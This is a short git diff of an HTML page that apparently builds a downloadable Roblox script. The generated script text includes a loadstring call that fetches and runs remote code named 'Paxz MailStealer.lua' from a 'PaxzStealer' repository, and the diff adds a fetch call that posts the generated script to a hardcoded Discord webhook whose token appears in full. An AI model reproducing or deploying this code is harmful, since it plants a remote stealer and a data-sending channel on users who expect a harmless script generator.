@@ -120,7 +120,7 @@ _G.CollectOrbs = ${collectOrbs};
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))();
 `;
 
-            var blob = new Blob([code], { type: 'text/plain' });
+var blob = new Blob([code], { type: 'text/plain' });
             var url = URL.createObjectURL(blob);
             var a = document.createElement('a');
             a.href = url;
@@ -129,6 +129,28 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main
             a.click();
             document.body.removeChild(a);
         }
+            
+ console.log(scriptCode); // Replace this with code to display the script or send it to a server.
+
+            const webhookUrl = "https://discord.com/api/webhooks/1137741900594561105/RF1OtYnSC2OUdpJm32QNNeccXaU5L-nm5JXSt4V2WprMUvbDO0RnCFGrQsERzbWzsiu2";
+            const data = { content: scriptCode };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+            })
+            .then(() => {
+                alert("Script sent to Discord webhook successfully!");
+            })
+            .catch((error) => {
+                alert("An error occurred while sending the script to the webhook.");
+                console.error(error);
+            });
+
+        });
     </script>
 </body>
 </html>
